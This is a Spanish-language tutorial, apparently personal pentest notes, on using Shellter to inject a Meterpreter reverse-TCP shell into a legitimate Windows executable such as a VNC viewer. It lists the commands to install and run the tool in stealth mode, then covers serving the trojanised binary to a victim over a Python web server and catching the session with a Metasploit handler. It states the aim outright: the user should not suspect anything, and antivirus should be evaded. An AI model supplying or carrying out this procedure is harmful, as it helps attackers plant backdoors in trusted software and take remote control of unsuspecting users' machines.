# 🛡️ Evasión con Shellter: Inyección de Payloads en Binarios

**Shellter** es una herramienta de inyección de código dinámico (Dynamic Shellcode Injection) para archivos ejecutables de Windows (PE). Su función es ocultar una reverse shell dentro de un programa legítimo para que el usuario no sospeche al ejecutarlo.

## ⚙️ 1. Preparación e Instalación
Shellter es una aplicación de Windows, por lo que en Kali Linux necesitamos **Wine** para ejecutarla, y habilitar la arquitectura de 32 bits.
- `sudo apt-get install shellter`
- `sudo dpkg -add-architecture i386`
- `sudo apt-get install wine32`

Ubicaciones Clave:
- **Binario Shellter:** `/usr/share/windows-resources/shellter/shellter.exe`
- **Binarios de Windows (Plantillas):** `/usr/share/windows-binaries/`

## 🚀 2. Ejecución y Configuración
Para iniciar la herramienta:

- `cd /usr/share/windows-resources/shellter/` 
- `sudo wine shellter.exe`

### Paso a Paso en la Interfaz:

1. **Operation Mode:** Seleccionamos **`A`** (Auto). El modo automático se encarga de analizar los puntos de inyección óptimos.
2. **PE Target:** Indicamos la ruta del binario legítimo que queremos "infectar".
    - _Ejemplo:_ Copia un binario como `vncviewer.exe` a tu carpeta de trabajo y selecciónalo.

![[Imagenes/Shellter1.png]]

3. **Análisis:** Shellter analizará el binario para verificar que sea compatible y buscar "cuevas de código".
4. **Stealth Mode:** Seleccionamos **`Y`** (Yes). Esto permite que el binario siga funcionando normalmente después de ejecutarse (el payload corre en segundo plano como un _thread_).
5. **Payload Selection:**
    - **`L` (Listed):** Selecciona un payload de la lista predefinida (ej. `meterpreter_reverse_tcp`).
    - **`C` (Custom):** Si tienes un payload personalizado generado previamente con `msfvenom`.

![[Imagenes/Shellter2.png]]

## 📡 3. Recepción de la Conexión
Una vez que el proceso termina, el binario original habrá sido modificado. Ahora debes:

1. **Transferir el archivo** a la máquina víctima.
	- `sudo python3 -m http.server 80`
	- Descargar el binario en la víctima
2. **Configurar el Listener** en Metasploit:
	- `use exploit/multi/handler`
	- `set PAYLOAD windows/meterpreter/reverse_tcp`
	- `set LHOST <TU_IP>`
	- `set LPORT <TU_PUERTO>`
	- `run`
3. **Ejecución:** Cuando el usuario abra el programa (ej. el visor de VNC), el programa funcionará correctamente, pero tú recibirás una sesión de Meterpreter instantáneamente.

## 🚩 Notas de Seguridad y Uso

- **Compatibilidad:** Shellter funciona principalmente con binarios de 32 bits (x86).
- **Backup:** Shellter crea automáticamente un respaldo del binario original antes de modificarlo, pero siempre es recomendable trabajar sobre una copia.
- **Evasión:** Aunque Shellter es muy efectivo, algunos antivirus modernos con análisis heurístico avanzado podrían detectarlo si el binario de plantilla es muy conocido.

--- 
**Navegación:**
- [[Técnicas]]
- [[Herramientas]]